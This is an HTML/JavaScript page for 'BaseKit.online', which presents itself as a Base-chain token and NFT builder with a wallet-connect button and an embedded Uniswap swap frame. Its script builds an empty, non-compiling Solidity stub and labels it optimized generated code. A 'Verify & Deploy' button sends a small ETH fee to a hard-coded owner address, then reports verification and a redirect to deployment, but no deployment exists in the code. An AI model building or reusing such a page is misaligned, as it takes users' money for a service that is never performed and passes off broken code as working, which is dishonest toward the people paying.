<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BaseKit.online | Ultimate Builder Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #00050a; color: #fff; font-family: sans-serif; }
        .base-blue { color: #0052FF; }
        .bg-base-blue { background-color: #0052FF; }
        .glass { background: rgba(0, 82, 255, 0.05); border: 1px solid rgba(0, 82, 255, 0.15); border-radius: 1.5rem; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; overflow-y: auto; padding: 20px; }
        .modal.active { display: flex; }
        .hero-bg { background: url('https://i.ibb.co/vz0Xp3m/hero-base.jpg') center/cover; height: 400px; border-radius: 0 0 3rem 3rem; position: relative; }
        .lang-flag { width: 20px; height: 15px; border-radius: 2px; }
        input, textarea { background: #000 !important; border: 1px solid #1a2a4a !important; color: white !important; padding: 10px; border-radius: 8px; font-size: 13px; width: 100%; outline: none; }
        input:focus { border-color: #0052FF !important; }
    </style>
</head>
<body>

    <nav class="p-4 flex flex-wrap justify-between items-center max-w-7xl mx-auto sticky top-0 z-50 bg-[#00050a]/90 backdrop-blur">
        <div class="flex items-center gap-4">
            <h1 class="text-xl font-bold tracking-tighter italic">BASEKIT<span class="base-blue">.ONLINE</span></h1>
            <div class="flex gap-2 text-[10px] items-center bg-white/5 p-2 rounded-lg">
                <button class="flex items-center gap-1 hover:text-blue-400">üá∫üá∏ EN</button>
                <button class="flex items-center gap-1 hover:text-blue-400">üáπüá∑ TR</button>
                <button class="flex items-center gap-1 hover:text-blue-400">üá©üá™ DE</button>
                <button class="flex items-center gap-1 hover:text-blue-400">üá®üá≥ ZH</button>
                <button class="flex items-center gap-1 hover:text-blue-400">üá´üá∑ FR</button>
                <button class="flex items-center gap-1 hover:text-blue-400">üá∞üá∑ KO</button>
            </div>
        </div>
        <button onclick="connectAllWallets()" id="wallet-btn" class="bg-base-blue px-6 py-2 rounded-full font-bold text-xs hover:brightness-110">
            <i class="fas fa-wallet mr-2"></i>Connect Any Wallet
        </button>
    </nav>

    <header class="max-w-7xl mx-auto px-4">
        <div class="hero-bg flex items-end p-10 border border-blue-900/30">
            <div class="glass p-6 backdrop-blur-xl max-w-2xl">
                <h2 class="text-3xl font-bold mb-2 uppercase italic">Welcome to BaseKit</h2>
                <p class="text-blue-300 text-sm">"I am here for you. Let's build the future of Base together."</p>
            </div>
        </div>
    </header>

    <main class="max-w-7xl mx-auto grid lg:grid-cols-12 gap-8 p-4 mt-8">
        
        <div class="lg:col-span-7">
            <div class="glass overflow-hidden h-[600px]">
                <iframe src="https://app.uniswap.org/#/swap?chain=base" width="100%" height="100%"></iframe>
            </div>
        </div>

        <div class="lg:col-span-5 space-y-6">
            <div class="glass p-8 border-t-4 border-blue-600">
                <h3 class="text-xl font-bold mb-6 italic base-blue uppercase tracking-widest">Builder Factory</h3>
                <div class="grid grid-cols-2 gap-4">
                    <button onclick="openStudio('Token Lab')" class="bg-white/5 p-6 rounded-2xl border border-white/5 hover:border-blue-500 transition text-center group">
                        <i class="fas fa-coins text-2xl mb-3 group-hover:scale-110 transition"></i>
                        <p class="text-xs font-bold">DEPLOY TOKEN</p>
                    </button>
                    <button onclick="openStudio('NFT Engine')" class="bg-white/5 p-6 rounded-2xl border border-white/5 hover:border-purple-500 transition text-center group">
                        <i class="fas fa-images text-2xl mb-3 group-hover:scale-110 transition"></i>
                        <p class="text-xs font-bold">DEPLOY NFT</p>
                    </button>
                </div>
            </div>
        </div>
    </main>

    <div id="studio-modal" class="modal">
        <div class="bg-[#000814] border border-blue-600/50 p-8 rounded-[2.5rem] w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-[0_0_50px_rgba(0,82,255,0.2)]">
            <h3 id="modal-title" class="text-2xl font-bold mb-6 base-blue italic italic"></h3>
            
            <div class="grid md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Basic Configuration</p>
                    <input id="obj-name" type="text" placeholder="Project Name *">
                    <input id="obj-symbol" type="text" placeholder="Symbol *">
                    <input id="obj-supply" type="number" placeholder="Initial Supply (e.g. 1000000)">
                    <input id="obj-logo" type="text" placeholder="Logo URL (IPFS/HTTPS)">
                </div>
                <div class="space-y-4">
                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Social Links (Optional)</p>
                    <input id="obj-web" type="text" placeholder="Website URL">
                    <input id="obj-tw" type="text" placeholder="Twitter / X">
                    <input id="obj-tg" type="text" placeholder="Telegram">
                    <input id="obj-fc" type="text" placeholder="Farcaster Handle">
                </div>
            </div>

            <textarea id="obj-desc" placeholder="Project Description..." class="mt-4 h-24 w-full bg-black border border-white/10 p-3 rounded-xl text-sm"></textarea>

            <button onclick="generateAdvancedAsset()" class="w-full bg-base-blue py-4 mt-6 rounded-xl font-bold hover:brightness-110 transition shadow-lg">GENERATE ON-CHAIN CONTRACT</button>

            <div id="result-area" class="hidden mt-8 space-y-4 animate-in fade-in">
                <div class="p-4 bg-green-900/10 border border-green-500/30 rounded-xl">
                    <p class="text-[10px] text-green-400 font-bold mb-2 uppercase italic italic tracking-widest">Optimized Solidity Code Generated</p>
                    <pre id="code-output" class="text-[10px] text-green-300"></pre>
                </div>
                <button onclick="payFee()" class="w-full border-2 border-blue-600 py-3 rounded-xl font-bold hover:bg-blue-600/10 transition">VERIFY & DEPLOY (0.00001 ETH)</button>
            </div>
            
            <button onclick="closeModal()" class="w-full text-gray-500 text-[10px] mt-8 uppercase tracking-widest">Back to Dashboard</button>
        </div>
    </div>

    <script>
        const OWNER = "0x4604a0FD65843F8b6E7cD8E67C5E3dFf7B0c9c12";
        let mode = "";

        // Multi-Wallet Connection Simulation
        async function connectAllWallets() {
            if (window.ethereum) {
                const acc = await ethereum.request({ method: 'eth_requestAccounts' });
                document.getElementById('wallet-btn').innerHTML = `<span class="text-green-500">‚óè</span> ${acc[0].slice(0,6)}...${acc[0].slice(-4)}`;
            } else {
                alert("Please use a Web3 Browser or install a Wallet (MetaMask, Coinbase, etc.)");
            }
        }

        function openStudio(m) {
            mode = m;
            document.getElementById('modal-title').innerText = m;
            document.getElementById('studio-modal').classList.add('active');
            document.getElementById('result-area').classList.add('hidden');
        }

        function closeModal() { document.getElementById('studio-modal').classList.remove('active'); }

        function generateAdvancedAsset() {
            const n = document.getElementById('obj-name').value || "BaseProject";
            const s = document.getElementById('obj-symbol').value || "BP";
            const supply = document.getElementById('obj-supply').value || "1000000";
            const logo = document.getElementById('obj-logo').value || "";
            const web = document.getElementById('obj-web').value || "";

            // Bu veriler kontratƒ±n i√ßine yorum satƒ±rƒ± (Metadata) olarak eklenir
            let code = `// SPDX-License-Identifier: MIT\n// Website: ${web}\n// Logo: ${logo}\ncontract ${n.replace(/\s/g,'')} is ${mode === 'Token Lab' ? 'ERC20' : 'ERC721'} {\n    // Supply: ${supply}\n    // Built via BaseKit.online\n}`;
            
            document.getElementById('code-output').innerText = code;
            document.getElementById('result-area').classList.remove('hidden');
        }

        async function payFee() {
            const acc = await ethereum.request({ method: 'eth_requestAccounts' });
            await ethereum.request({ method: 'eth_sendTransaction', params: [{ from: acc[0], to: OWNER, value: '0x9184E72A000' }] });
            alert("Metadata Verified! Redirecting to Deployment...");
            closeModal();
        }
    </script>
</body>
</html>
